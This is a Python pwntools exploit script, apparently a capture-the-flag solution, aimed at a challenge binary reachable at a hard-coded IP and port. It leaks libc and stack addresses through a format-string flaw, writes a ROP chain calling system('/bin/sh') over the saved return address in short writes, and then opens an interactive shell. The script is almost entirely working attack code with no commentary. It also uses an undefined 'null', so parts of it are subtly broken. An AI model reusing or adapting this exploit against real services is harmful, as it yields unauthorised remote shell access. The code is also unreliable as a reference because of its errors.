#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "34.70.212.151", 8002
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            b *$rebase(0x143b)
            """
            gdb.attach(io, gdbscript=cmd)
    io.sendlineafter(b">> ", b"1")
    io.recvuntil(b"0x")
    LEAKED_LIBC = int(io.recvuntil(b"\n", drop=True), 16)
    libc.address = LEAKED_LIBC - libc.symbols["fgets"]
    print("LEAKED_LIBC                  :", hex(LEAKED_LIBC))
    print("libc.address                 :", hex(libc.address))

    io.sendlineafter(b">> ", b"2")
    
    p = b""
    p += b"|%12$llo|"
    io.sendlineafter(b">> ", p)
    io.recvuntil(b"|")
    LEAKED_STACK = int(io.recvuntil(b"|", drop=True), 8)
    SAVED_RIP_MAIN = LEAKED_STACK + 0x8
    print("LEAKED_STACK                 :", hex(LEAKED_STACK))
    print("SAVED_RIP_MAIN               :", hex(SAVED_RIP_MAIN))

    payload = [
        libc.search(asm("pop rdi; ret")).__next__()+1,
        libc.search(asm("pop rdi; ret")).__next__(),
        libc.search(b"/bin/sh").__next__(),
        libc.symbols["system"],
    ]

    for i in range(len(payload)):
        current_val = payload[i]
        for j in range(3):
            tmp_val = current_val >> (j * 8 * 2) & 0xFFFF
            io.sendlineafter(b">> ", b"2")
            print(i, hex(tmp_val))

            p = b""
            p += fmtstr_payload(6, {SAVED_RIP_MAIN+(i*8)+(j*2):tmp_val}, write_size="short")
            io.sendlineafter(b">> ", p)

    io.sendlineafter(b">> ", b"4")
    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
    libc = ELF("libc.so.6")
    exploit(io, libc)
